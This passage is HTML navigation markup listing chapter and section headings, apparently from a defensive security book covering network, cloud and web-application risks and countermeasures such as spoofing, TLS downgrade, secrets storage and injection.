            </ul>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources'>Wrongfully Trusting the Loading of Untrusted Web Resources</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp'>Content Security Policy (CSP)</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri'>Sub-resource Integrity (SRI)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-tls-downgrade'>TLS Downgrade</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-tls-downgrade-hsts'>HTTP Strict Transport Security (HSTS)</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-tls-downgrade-hsts-preload'>HTTP Strict Transport Security (HSTS) Preload</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-tls-downgrade-x509-cert-revocation-evolution'>X.509 Certificate Revocation Evolution</a>
                <ul>
                  <li>
                    <a href='chap04.html#leanpub-auto-initiative-1-certification-revocation-list-crl'>Initiative 1: Certification Revocation List (CRL)</a>
                  </li>
                  <li>
                    <a href='chap04.html#network-countermeasures-tls-downgrade-certificate-revocation-evolution-ocsp'>Initiative 2: Online Certificate Status Protocol (OCSP)</a>
                  </li>
                  <li>
                    <a href='chap04.html#leanpub-auto-one-of-the-big-problems'>One of the Big Problems</a>
                  </li>
                  <li>
                    <a href='chap04.html#leanpub-auto-initiative-3-welcome-to-ocsp-staplinghttpenwikipediaorgwikiocspstapling'>Initiative 3: Welcome to OCSP Stapling</a>
                  </li>
                  <li>
                    <a href='chap04.html#leanpub-auto-ocsp-stapling-problem'>OCSP Stapling Problem</a>
                  </li>
                  <li>
                    <a href='chap04.html#network-countermeasures-tls-downgrade-certificate-revocation-evolution-fix-to-ocsp'>Initiative 4: Fix to the OCSP Stapling Problem</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap04.html#network-risks-that-solution-causes'>4. SSM Risks that Solution Causes</a>
        <ul>
          <li>
            <a href='chap04.html#leanpub-auto-fortress-mentality'>Fortress Mentality</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-segmentation'>Lack of Segmentation</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-visibility-4'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-insufficient-logging-1'>Insufficient Logging</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-lack-of-network-intrusion-detection-systems-nids-1'>Lack of Network Intrusion Detection Systems (NIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-spoofing'>Spoofing</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-ip'>IP</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-arp-address-resolution-protocol'>ARP (Address Resolution Protocol)</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns'>DNS</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-referrer'>Referrer</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-data-exfiltration-infiltration-1'>Data Exfiltration, Infiltration</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-dropbox-1'>Dropbox</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-physical-2'>Physical</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-mobile-phone-data-2'>Mobile Phone Data</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns-ssh-2'>DNS, SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-doppelganger-domains'>Doppelganger Domains</a>
          </li>
          <li>
            <a href='chap04.html#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources'>Wrongfully Trusting the Loading of Untrusted Web Resources</a>
            <ul>
              <li>
                <a href='chap04.html#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp'>Content Security Policy (CSP)</a>
              </li>
              <li>
                <a href='chap04.html#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri'>Sub-resource Integrity (SRI)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-risks-that-solution-causes-tls-downgrade'>TLS Downgrade</a>
            <ul>
              <li>
                <a href='chap04.html#network-risks-that-solution-causes-tls-downgrade-hsts'>HTTP Strict Transport Security (HSTS)</a>
              </li>
              <li>
                <a href='chap04.html#network-risks-that-solution-causes-tls-downgrade-hsts-preload'>HTTP Strict Transport Security (HSTS) Preload</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap04.html#network-costs-and-trade-offs'>5. SSM Costs and Trade-offs</a>
        <ul>
          <li>
            <a href='chap04.html#leanpub-auto-fortress-mentality-1'>Fortress Mentality</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-segmentation-1'>Lack of Segmentation</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-visibility-5'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-insufficient-logging-2'>Insufficient Logging</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-lack-of-network-intrusion-detection-systems-nids-2'>Lack of Network Intrusion Detection Systems (NIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-spoofing-1'>Spoofing</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-data-exfiltration-infiltration-2'>Data Exfiltration, Infiltration</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-dropbox-2'>Dropbox</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-physical-3'>Physical</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-mobile-phone-data-3'>Mobile Phone Data</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns-ssh-3'>DNS, SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-doppelganger-domains-1'>Doppelganger Domains</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-wrongfully-trusting-the-loading-of-untrusted-web-resources'>Wrongfully Trusting the Loading of Untrusted Web Resources</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-content-security-policy-csp'>Content Security Policy (CSP)</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-sub-resource-integrity-sri'>Sub-resource Integrity (SRI)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-tls-downgrade'>TLS Downgrade</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-http-strict-transport-security-hsts'>HTTP Strict Transport Security (HSTS)</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-http-strict-transport-security-hsts-preload'>HTTP Strict Transport Security (HSTS) Preload</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap05.html#cloud'>9. Cloud</a>
    <ul>
      <li>
        <a href='chap05.html#leanpub-auto-ssm-asset-identification-1'>1. SSM Asset Identification</a>
        <ul>
          <li>
            <a href='chap05.html#leanpub-auto-productivity'>Productivity</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-competitive-advantage'>Competitive Advantage</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-control'>Control</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-data'>Data</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap05.html#cloud-identify-risks'>2. SSM Identify Risks</a>
        <ul>
          <li>
            <a href='chap05.html#cloud-identify-risks-shared-responsibility-model'>Shared Responsibility Model</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-csp-responsibility'>CSP Responsibility</a>
              </li>
              <li>
                <a href='chap05.html#cloud-identify-risks-shared-responsibility-model-csp-customer-responsibility'>CSP Customer Responsibility</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-csp-evaluation'>CSP Evaluation</a>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-cloud-service-provider-vs-in-house'>Cloud Service Provider vs In-house</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-skills'>Skills</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-eula'>EULA</a>
              </li>
              <li>
                <a href='chap05.html#cloud-identify-risks-cloud-service-provider-vs-in-house-giving-up-secrets'>Giving up Secrets</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-location-of-data'>Location of Data</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-vendor-lock-in'>Vendor lock-in</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-possible-single-points-of-failure'>Possible Single Points of Failure</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-review-other-chapters'>Review Other Chapters</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-people'>People</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-application-security-1'>Application Security</a>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-network-security'>Network Security</a>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-violations-of-least-privilege'>Violations of Least Privilege</a>
            <ul>
              <li>
                <a href='chap05.html#cloud-identify-risks-violations-of-least-privilege-machine-instance-single-user-root'>Machine Instance Single User Root</a>
              </li>
              <li>
                <a href='chap05.html#cloud-identify-risks-violations-of-least-privilege-csp-account-single-user-root'>CSP Account Single User Root</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-storage-of-secrets'>Storage of Secrets</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-private-key-abuse'>Private Key Abuse</a>
                <ul>
                  <li>
                    <a href='chap05.html#cloud-identify-risks-storage-of-secrets-private-key-abuse-ssh'>SSH</a>
                  </li>
                  <li>
                    <a href='chap05.html#cloud-identify-risks-storage-of-secrets-private-key-abuse-tls'>TLS</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap05.html#cloud-identify-risks-storage-of-secrets-credentials-and-other-secrets'>Credentials and Other Secrets</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-people-manually'>Entered by People (manually)</a>
                  </li>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-software-automatically'>Entered by Software (automatically)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-serverless'>Serverless</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-third-party-services'>Third Party Services</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-perimeterless'>Perimeterless</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-functions'>Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-dos-of-lambda-functions'>DoS of Lambda Functions</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-infrastructure-and-configuration-management'>Infrastructure and Configuration Management</a>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-aws'>AWS</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-password-less-sudo'>Password-less sudo</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap05.html#leanpub-auto-ssm-countermeasures'>3. SSM Countermeasures</a>
        <ul>
          <li>
            <a href='chap05.html#leanpub-auto-shared-responsibility-model'>Shared Responsibility Model</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-csp-responsibility-1'>CSP Responsibility</a>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-shared-responsibility-model-csp-customer-responsibility'>CSP Customer Responsibility</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-csp-evaluation'>CSP Evaluation</a>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-cloud-service-provider-vs-in-house'>Cloud Service Provider vs In-house</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-skills-1'>Skills</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-eula-1'>EULA</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-giving-up-secrets'>Giving up Secrets</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-location-of-data-1'>Location of Data</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-vendor-lock-in-1'>Vendor lock-in</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-possible-single-points-of-failure-1'>Possible Single Points of Failure</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-review-other-chapters'>Review Other Chapters</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-people-1'>People</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-application-security-2'>Application Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-network-security'>Network Security</a>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-violations-of-least-privilege'>Violations of Least Privilege</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-machine-instance-single-user-root'>Machine Instance Single User Root</a>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-violations-of-least-privilege-csp-account-single-user-root'>CSP Account Single User Root</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-storage-of-secrets'>Storage of Secrets</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-private-key-abuse-1'>Private Key Abuse</a>
                <ul>
                  <li>
                    <a href='chap05.html#cloud-countermeasures-storage-of-secrets-private-key-abuse-ssh'>SSH</a>
                  </li>
                  <li>
                    <a href='chap05.html#cloud-countermeasures-storage-of-secrets-private-key-abuse-tls'>TLS</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-storage-of-secrets-credentials-and-other-secrets'>Credentials and Other Secrets</a>
                <ul>
                  <li>
                    <a href='chap05.html#cloud-countermeasures-storage-of-secrets-credentials-and-other-secrets-entered-by-people-manually'>Entered by People (manually)</a>
                  </li>
                  <li>
                    <a href='chap05.html#cloud-countermeasures-storage-of-secrets-credentials-and-other-secrets-entered-by-software'>Entered by Software (automatically)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-serverless'>Serverless</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-third-party-services-1'>Third Party Services</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-perimeterless-1'>Perimeterless</a>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-serverless-functions'>Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-dos-of-lambda-functions-1'>DoS of Lambda Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-centralised-logging-of-aws-lambdahttpshackernooncomcentralised-logging-for-aws-lambda-b765b7ca9152-functions'>Centralised logging of AWS Lambda Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-frameworks'>Frameworks</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-infrastructure-and-configuration-management'>Infrastructure and Configuration Management</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-aws'>AWS</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-password-less-sudo-1'>Password-less sudo</a>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-aws-additional-tooling'>Additional Tooling</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap05.html#leanpub-auto-ssm-risks-that-solution-causes'>4. SSM Risks that Solution Causes</a>
        <ul>
          <li>
            <a href='chap05.html#leanpub-auto-shared-responsibility-model-1'>Shared Responsibility Model</a>
          </li>
          <li>
            <a href='chap05.html#cloud-risks-that-the-solution-causes-csp-evaluation'>CSP Evaluation</a>
          </li>
          <li>
            <a href='chap05.html#cloud-risks-that-the-solution-causes-cloud-service-provider-vs-in-house'>Cloud Service Provider vs In-house</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-people-2'>People</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-application-security-3'>Application Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-network-security-1'>Network Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-violations-of-least-privilege'>Violations of Least Privilege</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-storage-of-secrets'>Storage of Secrets</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-private-key-abuse-2'>Private Key Abuse</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-ssh-2'>SSH</a>
                  </li>
                  <li>
                    <a href='chap05.html#leanpub-auto-tls'>TLS</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-credentials-and-other-secrets'>Credentials and Other Secrets</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-people-manually-1'>Entered by People (manually)</a>
                  </li>
                  <li>
                    <a href='chap05.html#cloud-risks-that-solution-causes-storage-of-secrets-credentials-and-other-secrets-entered-by-software'>Entered by Software (automatically)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-serverless'>Serverless</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-functions-1'>Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-dos-of-lambda-functions-2'>DoS of Lambda Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-frameworks-1'>Frameworks</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-infrastructure-and-configuration-management-1'>Infrastructure and Configuration Management</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-aws-1'>AWS</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-additional-tooling'>Additional Tooling</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap05.html#leanpub-auto-ssm-costs-and-trade-offs'>5. SSM Costs and Trade-offs</a>
        <ul>
          <li>
            <a href='chap05.html#leanpub-auto-shared-responsibility-model-2'>Shared Responsibility Model</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-csp-evaluation'>CSP Evaluation</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-cloud-service-provider-vs-in-house'>Cloud Service Provider vs In-house</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-people-3'>People</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-application-security-4'>Application Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-network-security-2'>Network Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-violations-of-least-privilege-1'>Violations of Least Privilege</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-storage-of-secrets-1'>Storage of Secrets</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-private-key-abuse-3'>Private Key Abuse</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-ssh-3'>SSH</a>
                  </li>
                  <li>
                    <a href='chap05.html#leanpub-auto-tls-1'>TLS</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-credentials-and-other-secrets-1'>Credentials and Other Secrets</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-people-manually-2'>Entered by People (manually)</a>
                  </li>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-software-automatically-1'>Entered by Software (automatically)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-serverless-1'>Serverless</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-functions-2'>Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-dos-of-lambda-functions-3'>DoS of Lambda Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-frameworks-2'>Frameworks</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-infrastructure-and-configuration-management-2'>Infrastructure and Configuration Management</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-aws-2'>AWS</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-additional-tooling-1'>Additional Tooling</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap06.html#web-applications'>10. Web Applications</a>
    <ul>
      <li>
        <a href='chap06.html#leanpub-auto-ssm-asset-identification-2'>1. SSM Asset Identification</a>
      </li>
      <li>
        <a href='chap06.html#leanpub-auto-ssm-identify-risks-2'>2. SSM Identify Risks</a>
        <ul>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-visibility-6'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-insufficient-logging-and-monitoring'>Insufficient Logging and Monitoring</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-lack-of-input-validation-and-sanitisation'>Lack of Input Validation, Filtering and Sanitisation</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-generic'>Generic</a>
                <ul>
                  <li>
                    <a href='chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation'>What is Validation</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-filtering'>What is Filtering</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation'>What is Sanitisation</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-cross-site-scripting'>Cross-Site Scripting (XSS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-csrf'>Cross-Site Request Forgery (CSRF)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-injection'>Injection</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-identify-risks-sqli'>SQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-nosqli'>NoSQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-command-injection'>Command Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-xml-injection'>XML Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-xslt-injection'>XSLT Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-xpath-injection'>XPath Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-xquery-injection'>XQuery Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-ldap-injection'>LDAP Injection</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-captcha'>Captcha</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-management-of-application-secrets'>Management of Application Secrets</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-identify-risks-management-of-application-secrets-data-store-compromise'>Data-store Compromise</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-management-of-application-secrets-cracking'>Cracking</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-lack-of-authentication-authorisation-session-management'>Lack of Authentication, Authorisation and Session Management</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-what-is-authentication'>What is Authentication</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-what-is-authorisation'>What is Authorisation</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-cryptography-on-the-client'>Cryptography on the Client (AKA Untrusted Crypto)</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-consuming-free-and-open-source'>Consuming Free and Open Source</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-insufficient-attack-protection'>Insufficient Attack Protection</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-lack-of-active-automated-prevention'>Lack of Active Automated Prevention</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap06.html#leanpub-auto-ssm-countermeasures-1'>3. SSM Countermeasures</a>
        <ul>
          <li>
            <a href='chap06.html#web-applications-countermeasures-lack-of-visibility'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-lack-of-visibility-insufficient-logging'>Insufficient Logging</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-opening-udp-port'>Opening UDP port</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-using-posix'>Using Posix</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-insufficient-monitoring'>Insufficient Monitoring</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-dark-cockpit'>Dark Cockpit</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing'>Statistics Graphing</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation'>Lack of Input Validation, Filtering and Sanitisation</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic'>Generic</a>
                <ul>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping'>Types of Escaping:</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp'>Example in JavaScript and C#</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-nodejs'>Example in JavaScript and NodeJS</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-other-things-to-think-about'>Other things to think about</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-cross-site-scripting'>Cross-Site Scripting (XSS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-cross-site-request-forgery-csrf'>Cross-Site Request Forgery (CSRF)</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-injection'>Injection</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-sqli'>SQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-nosqli'>NoSQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-command-injection'>Command Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-xml-injection'>XML Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-xslt-injection'>XSLT Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-xpath-injection'>XPath Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-xquery-injection'>XQuery Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-ldap-injection'>LDAP Injection</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-captcha'>Captcha</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-types'>Types</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-offerings'>Offerings</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-alternative-approaches'>Alternative Approaches</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-still-not-cutting-it'>Still Not Cutting it</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-user-time-expenditure'>User Time Expenditure</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-bot-pot'>Bot Pot</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-testing'>Testing</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets'>Management of Application Secrets</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets-store-configuration'>Store Configuration in Configuration files</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-node-config'>node-config</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows'>Windows</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-linux'>Linux</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets-least-privilege'>Least Privilege</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-location'>Location</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-data-store-compromise'>Data-store Compromise</a>
                <ul>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-data-store-compromise-which-kdf-to-use'>Which KDF to use?</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets-caching-of-sensitive-data'>Caching of Sensitive Data</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-cracking'>Cracking</a>
              </li>
            </ul>
          </li>
          <li>
